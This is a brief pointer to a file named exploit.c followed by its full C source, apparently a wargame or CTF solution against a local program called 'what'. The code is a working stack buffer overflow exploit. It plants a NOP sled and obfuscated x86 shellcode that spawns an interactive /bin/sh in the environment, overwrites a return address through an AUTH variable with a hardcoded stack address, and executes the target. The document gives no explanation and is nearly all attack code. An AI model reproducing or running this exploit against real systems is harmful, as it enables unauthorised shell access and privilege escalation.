See `/home/james/what/exploit.c`.



```
#include <stdio.h>
#include <string.h>

int main(void)
{
    char shellcode[] = // /bin/sh, no slashes
        "\xeb\x33\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x89\x76\x0b\x8d"
        "\x5e\x08\x89\x5e\x0f\x89\x46\x13\x8a\x06\xfe\xc0\xfe\xc0\x88"
        "\x06\x8a\x46\x04\xfe\xc0\xfe\xc0\x88\x46\x04\xb0\x0b\x89\xf3"
        "\x8d\x4e\x0b\x8d\x56\x13\xcd\x80\xe8\xc8\xff\xff\xff\x2d\x62"
        "\x69\x6e\x2d\x73\x68\x23\x2d\x69\x23\x41\x41\x41\x41\x42\x42"
        "\x42\x42\x43\x43\x43\x43";
    char buf[4096];
    char egg[4096];
    char nopsled[4096];
    char *args[] = {"/home/what/what", "ausgeschnitzel", "flugelfragen", NULL };
    char *envp[] = { egg, nopsled, NULL };
    unsigned long addr = 0xffffdf30;

    memset (buf, 0, sizeof(buf));
    memset (buf, 0xcc, 128);
    *(unsigned long *)&buf[128] = addr;
    *(unsigned long *)&buf[132] = addr;
    *(unsigned long *)&buf[136] = addr;
    *(unsigned long *)&buf[140] = addr;
    sprintf (egg, "AUTH=%s/drachenfutter/", buf);

    memset (nopsled, 0, sizeof(nopsled));
    memset (nopsled, 0x90, 3000);
    strcat (nopsled, shellcode);

    clearenv();

    execve (args[0], args, envp);

    return -1;
}
```